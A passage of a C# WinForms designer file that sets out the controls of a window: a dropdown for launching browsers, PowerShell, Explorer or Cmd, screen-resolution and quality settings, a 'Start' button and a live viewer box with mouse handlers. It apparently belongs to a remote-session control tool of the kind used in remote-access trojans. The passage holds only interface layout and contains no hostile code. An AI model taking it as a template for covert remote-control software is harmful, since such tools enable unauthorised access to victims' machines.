        this.RunApps.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.RunApps.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.RunApps.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.RunApps.ForeColor = System.Drawing.Color.White;
        this.RunApps.HoverState.Parent = this.RunApps;
        this.RunApps.Location = new System.Drawing.Point(162, 207);
        this.RunApps.Name = "RunApps";
        this.RunApps.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.RunApps.PressedDepth = 50;
        this.RunApps.ShadowDecoration.Parent = this.RunApps;
        this.RunApps.Size = new System.Drawing.Size(76, 29);
        this.RunApps.TabIndex = 672;
        this.RunApps.Text = "Run";
        this.RunApps.Click += new System.EventHandler(RunApps_Click);
        this.ListApps.BackColor = System.Drawing.Color.Transparent;
        this.ListApps.BackgroundColor = System.Drawing.Color.White;
        this.ListApps.BorderColor = System.Drawing.Color.Silver;
        this.ListApps.BorderRadius = 1;
        this.ListApps.Color = System.Drawing.Color.Silver;
        this.ListApps.Direction = Bunifu.UI.WinForms.BunifuDropdown.Directions.Down;
        this.ListApps.DisabledBackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.ListApps.DisabledBorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ListApps.DisabledColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.ListApps.DisabledForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        this.ListApps.DisabledIndicatorColor = System.Drawing.Color.DarkGray;
        this.ListApps.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
        this.ListApps.DropdownBorderThickness = Bunifu.UI.WinForms.BunifuDropdown.BorderThickness.Thin;
        this.ListApps.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ListApps.DropDownTextAlign = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ListApps.FillDropDown = true;
        this.ListApps.FillIndicator = false;
        this.ListApps.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
        this.ListApps.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ListApps.ForeColor = System.Drawing.Color.Black;
        this.ListApps.FormattingEnabled = true;
        this.ListApps.Icon = null;
        this.ListApps.IndicatorAlignment = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ListApps.IndicatorColor = System.Drawing.Color.DarkGray;
        this.ListApps.IndicatorLocation = Bunifu.UI.WinForms.BunifuDropdown.Indicator.Right;
        this.ListApps.IndicatorThickness = 2;
        this.ListApps.IsDropdownOpened = false;
        this.ListApps.ItemBackColor = System.Drawing.Color.White;
        this.ListApps.ItemBorderColor = System.Drawing.Color.White;
        this.ListApps.ItemForeColor = System.Drawing.Color.Black;
        this.ListApps.ItemHeight = 20;
        this.ListApps.ItemHighLightColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListApps.ItemHighLightForeColor = System.Drawing.Color.White;
        this.ListApps.Items.AddRange(new object[7] { "Chrome Browser", "Firefox Browser", "Brave Browser", "Edge Browser", "Powershell", "Explorer", "Cmd" });
        this.ListApps.ItemTopMargin = 3;
        this.ListApps.Location = new System.Drawing.Point(61, 159);
        this.ListApps.Name = "ListApps";
        this.ListApps.Size = new System.Drawing.Size(177, 26);
        this.ListApps.TabIndex = 670;
        this.ListApps.Text = null;
        this.ListApps.TextAlignment = Bunifu.UI.WinForms.BunifuDropdown.TextAlign.Left;
        this.ListApps.TextLeftMargin = 5;
        this.SizeScreen.AllowParentOverrides = false;
        this.SizeScreen.AutoEllipsis = false;
        this.SizeScreen.AutoSize = false;
        this.SizeScreen.BackColor = System.Drawing.Color.White;
        this.SizeScreen.Cursor = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.CursorType = System.Windows.Forms.Cursors.Default;
        this.SizeScreen.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.SizeScreen.ForeColor = System.Drawing.Color.DarkGray;
        this.SizeScreen.Location = new System.Drawing.Point(138, 69);
        this.SizeScreen.Name = "SizeScreen";
        this.SizeScreen.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.SizeScreen.Size = new System.Drawing.Size(102, 28);
        this.SizeScreen.TabIndex = 659;
        this.SizeScreen.Text = "1920 x 1080";
        this.SizeScreen.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.SizeScreen.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ScreenY.AcceptsReturn = false;
        this.ScreenY.AcceptsTab = false;
        this.ScreenY.AnimationSpeed = 200;
        this.ScreenY.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenY.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenY.AutoSizeHeight = true;
        this.ScreenY.BackColor = System.Drawing.Color.Transparent;
        this.ScreenY.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenY.BackgroundImage");
        this.ScreenY.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenY.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenY.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenY.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenY.BorderRadius = 2;
        this.ScreenY.BorderThickness = 1;
        this.ScreenY.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenY.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenY.DefaultText = "1080";
        this.ScreenY.Enabled = false;
        this.ScreenY.FillColor = System.Drawing.Color.White;
        this.ScreenY.HideSelection = true;
        this.ScreenY.IconLeft = null;
        this.ScreenY.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.IconPadding = 10;
        this.ScreenY.IconRight = null;
        this.ScreenY.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenY.Lines = new string[1] { "1080" };
        this.ScreenY.Location = new System.Drawing.Point(75, 69);
        this.ScreenY.MaxLength = 32767;
        this.ScreenY.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenY.Modified = false;
        this.ScreenY.Multiline = false;
        this.ScreenY.Name = "ScreenY";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenY.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenY.OnIdleState = stateProperties4;
        this.ScreenY.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenY.PasswordChar = '\0';
        this.ScreenY.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenY.PlaceholderText = "Y";
        this.ScreenY.ReadOnly = false;
        this.ScreenY.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenY.SelectedText = "";
        this.ScreenY.SelectionLength = 0;
        this.ScreenY.SelectionStart = 0;
        this.ScreenY.ShortcutsEnabled = true;
        this.ScreenY.Size = new System.Drawing.Size(59, 28);
        this.ScreenY.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenY.TabIndex = 658;
        this.ScreenY.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenY.TextMarginBottom = 0;
        this.ScreenY.TextMarginLeft = 3;
        this.ScreenY.TextMarginTop = 1;
        this.ScreenY.TextPlaceholder = "Y";
        this.ScreenY.UseSystemPasswordChar = false;
        this.ScreenY.WordWrap = true;
        this.ScreenX.AcceptsReturn = false;
        this.ScreenX.AcceptsTab = false;
        this.ScreenX.AnimationSpeed = 200;
        this.ScreenX.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScreenX.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScreenX.AutoSizeHeight = true;
        this.ScreenX.BackColor = System.Drawing.Color.Transparent;
        this.ScreenX.BackgroundImage = (System.Drawing.Image)resources.GetObject("ScreenX.BackgroundImage");
        this.ScreenX.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ScreenX.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.ScreenX.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.ScreenX.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScreenX.BorderRadius = 2;
        this.ScreenX.BorderThickness = 1;
        this.ScreenX.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScreenX.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.ScreenX.DefaultText = "1920";
        this.ScreenX.Enabled = false;
        this.ScreenX.FillColor = System.Drawing.Color.White;
        this.ScreenX.HideSelection = true;
        this.ScreenX.IconLeft = null;
        this.ScreenX.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.IconPadding = 10;
        this.ScreenX.IconRight = null;
        this.ScreenX.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.ScreenX.Lines = new string[1] { "1920" };
        this.ScreenX.Location = new System.Drawing.Point(10, 69);
        this.ScreenX.MaxLength = 32767;
        this.ScreenX.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScreenX.Modified = false;
        this.ScreenX.Multiline = false;
        this.ScreenX.Name = "ScreenX";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScreenX.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScreenX.OnIdleState = stateProperties8;
        this.ScreenX.Padding = new System.Windows.Forms.Padding(3);
        this.ScreenX.PasswordChar = '\0';
        this.ScreenX.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScreenX.PlaceholderText = "X";
        this.ScreenX.ReadOnly = false;
        this.ScreenX.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScreenX.SelectedText = "";
        this.ScreenX.SelectionLength = 0;
        this.ScreenX.SelectionStart = 0;
        this.ScreenX.ShortcutsEnabled = true;
        this.ScreenX.Size = new System.Drawing.Size(59, 28);
        this.ScreenX.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScreenX.TabIndex = 604;
        this.ScreenX.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScreenX.TextMarginBottom = 0;
        this.ScreenX.TextMarginLeft = 3;
        this.ScreenX.TextMarginTop = 1;
        this.ScreenX.TextPlaceholder = "X";
        this.ScreenX.UseSystemPasswordChar = false;
        this.ScreenX.WordWrap = true;
        this.EnabledResize.AllowBindingControlAnimation = true;
        this.EnabledResize.AllowBindingControlColorChanges = false;
        this.EnabledResize.AllowBindingControlLocation = true;
        this.EnabledResize.AllowCheckBoxAnimation = true;
        this.EnabledResize.AllowCheckmarkAnimation = true;
        this.EnabledResize.AllowOnHoverStates = true;
        this.EnabledResize.AutoCheck = true;
        this.EnabledResize.BackColor = System.Drawing.Color.Transparent;
        this.EnabledResize.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnabledResize.BackgroundImage");
        this.EnabledResize.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.EnabledResize.BindingControl = this.TxDelay;
        this.EnabledResize.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.EnabledResize.BorderRadius = 6;
        this.EnabledResize.Checked = false;
        this.EnabledResize.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.EnabledResize.Cursor = System.Windows.Forms.Cursors.Hand;
        this.EnabledResize.CustomCheckmarkImage = null;
        this.EnabledResize.Location = new System.Drawing.Point(10, 38);
        this.EnabledResize.MinimumSize = new System.Drawing.Size(17, 17);
        this.EnabledResize.Name = "EnabledResize";
        this.EnabledResize.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.BorderRadius = 6;
        this.EnabledResize.OnCheck.BorderThickness = 2;
        this.EnabledResize.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnCheck.CheckmarkThickness = 2;
        this.EnabledResize.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.BorderRadius = 6;
        this.EnabledResize.OnDisable.BorderThickness = 2;
        this.EnabledResize.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.EnabledResize.OnDisable.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverChecked.BorderRadius = 6;
        this.EnabledResize.OnHoverChecked.BorderThickness = 2;
        this.EnabledResize.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.EnabledResize.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.EnabledResize.OnHoverChecked.CheckmarkThickness = 2;
        this.EnabledResize.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.EnabledResize.OnHoverUnchecked.BorderRadius = 6;
        this.EnabledResize.OnHoverUnchecked.BorderThickness = 1;
        this.EnabledResize.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.EnabledResize.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.EnabledResize.OnUncheck.BorderRadius = 6;
        this.EnabledResize.OnUncheck.BorderThickness = 1;
        this.EnabledResize.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.EnabledResize.Size = new System.Drawing.Size(21, 21);
        this.EnabledResize.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.EnabledResize.TabIndex = 657;
        this.EnabledResize.ThreeState = false;
        this.EnabledResize.ToolTipText = null;
        this.EnabledResize.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnabledResize_CheckedChanged);
        this.TxDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDelay.AutoSize = true;
        this.TxDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDelay.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TxDelay.ForeColor = System.Drawing.Color.Black;
        this.TxDelay.Location = new System.Drawing.Point(34, 42);
        this.TxDelay.Name = "TxDelay";
        this.TxDelay.Size = new System.Drawing.Size(84, 15);
        this.TxDelay.TabIndex = 656;
        this.TxDelay.Text = "Resize Enabled";
        this.MuneClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.MuneClose.AutoSize = true;
        this.MuneClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.MuneClose.Location = new System.Drawing.Point(233, 5);
        this.MuneClose.Name = "MuneClose";
        this.MuneClose.Size = new System.Drawing.Size(16, 15);
        this.MuneClose.TabIndex = 598;
        this.MuneClose.Text = "X";
        this.MuneClose.Click += new System.EventHandler(MuneClose_Click);
        this.ValueQuality.BackColor = System.Drawing.Color.White;
        this.ValueQuality.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ValueQuality.ForeColor = System.Drawing.Color.DimGray;
        this.ValueQuality.Location = new System.Drawing.Point(174, 116);
        this.ValueQuality.Name = "ValueQuality";
        this.ValueQuality.Size = new System.Drawing.Size(66, 17);
        this.ValueQuality.TabIndex = 640;
        this.ValueQuality.Text = "60% Quality";
        this.QualityTrackBar.BackColor = System.Drawing.Color.White;
        this.QualityTrackBar.FillColor = System.Drawing.Color.FromArgb(193, 200, 207);
        this.QualityTrackBar.HoverState.Parent = this.QualityTrackBar;
        this.QualityTrackBar.Location = new System.Drawing.Point(10, 115);
        this.QualityTrackBar.Name = "QualityTrackBar";
        this.QualityTrackBar.Size = new System.Drawing.Size(158, 23);
        this.QualityTrackBar.TabIndex = 630;
        this.QualityTrackBar.ThumbColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.QualityTrackBar.Value = 60;
        this.QualityTrackBar.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityTrackBar_Scroll);
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.BackColor = System.Drawing.Color.White;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(40, 5);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(180, 15);
        this.bunifuLabel17.TabIndex = 615;
        this.bunifuLabel17.Text = "Control Panel";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Power.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Power.BackColor = System.Drawing.Color.White;
        this.Power.BorderRadius = 4;
        this.Power.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Power.CheckedState.Parent = this.Power;
        this.Power.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Power.CustomImages.Parent = this.Power;
        this.Power.Enabled = false;
        this.Power.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Power.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Power.ForeColor = System.Drawing.Color.White;
        this.Power.HoverState.Parent = this.Power;
        this.Power.Location = new System.Drawing.Point(162, 279);
        this.Power.Name = "Power";
        this.Power.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Power.PressedDepth = 50;
        this.Power.ShadowDecoration.Parent = this.Power;
        this.Power.Size = new System.Drawing.Size(76, 29);
        this.Power.TabIndex = 574;
        this.Power.Text = "Start";
        this.Power.Click += new System.EventHandler(Power_Click);
        this.ViewerBox.BackColor = System.Drawing.Color.Black;
        this.ViewerBox.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ViewerBox.Location = new System.Drawing.Point(0, 0);
        this.ViewerBox.Name = "ViewerBox";
        this.ViewerBox.Size = new System.Drawing.Size(546, 321);
        this.ViewerBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ViewerBox.TabIndex = 577;
        this.ViewerBox.TabStop = false;
        this.ViewerBox.MouseDown += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseDown);
        this.ViewerBox.MouseMove += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseMove);
        this.ViewerBox.MouseUp += new System.Windows.Forms.MouseEventHandler(ViewerBox_MouseUp);
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(549, 458);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtonMune);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(546, 77);
        this.PanelTitle.TabIndex = 596;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtonMune.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMune.AutoRoundedCorners = true;
        this.ButtonMune.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMune.BorderRadius = 11;
        this.ButtonMune.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.ForeColor = System.Drawing.Color.White;
        this.ButtonMune.CheckedState.Parent = this.ButtonMune;
        this.ButtonMune.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMune.CustomImages.Parent = this.ButtonMune;
        this.ButtonMune.FillColor = System.Drawing.Color.White;
        this.ButtonMune.FillColor2 = System.Drawing.Color.White;
        this.ButtonMune.Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.ButtonMune.ForeColor = System.Drawing.SystemColors.InfoText;
        this.ButtonMune.HoverState.Parent = this.ButtonMune;
        this.ButtonMune.Image = Properties.Resources.iconleft;
        this.ButtonMune.ImageSize = new System.Drawing.Size(18, 18);
        this.ButtonMune.Location = new System.Drawing.Point(507, 42);
        this.ButtonMune.Name = "ButtonMune";
        this.ButtonMune.ShadowDecoration.Parent = this.ButtonMune;
        this.ButtonMune.Size = new System.Drawing.Size(24, 24);
        this.ButtonMune.TabIndex = 606;
        this.ButtonMune.Click += new System.EventHandler(ButtonMune_Click);
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(516, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(468, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
